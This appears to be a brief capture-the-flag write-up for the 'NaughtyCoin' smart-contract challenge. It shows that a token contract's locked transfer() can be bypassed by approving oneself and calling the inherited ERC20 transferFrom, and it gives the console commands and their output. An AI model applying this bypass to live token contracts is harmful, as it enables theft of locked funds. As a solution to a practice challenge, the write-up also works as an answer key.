# NaughtyCoin

Naughtycoin just locks the transfer() function
ERC20 implements transferFrom as well, so we can just approve to pass the spendAllowance checks, and use transferFrom to bypass the overridden transfer().

Solvable entirely within the console.


```js
await contract.approve(player, (await contract.INITIAL_SUPPLY()).toString());
{tx: '0x3322aafb1b660e1d1229fd593cceacfcfafed20bf0817ca0db77c9034d7cde2a', receipt: {…}, logs: Array(1)}
```

```js
await contract.transferFrom(player, contract.address, (await contract.INITIAL_SUPPLY()).toString());
{tx: '0x129ae1ff98088af9cdda64dce9118d4e63e75ab0b800c7c1b5b4e3bf2846e739', receipt: {…}, logs: Array(2)}
```

```js
(await contract.balanceOf(player)).toString();
'0'
```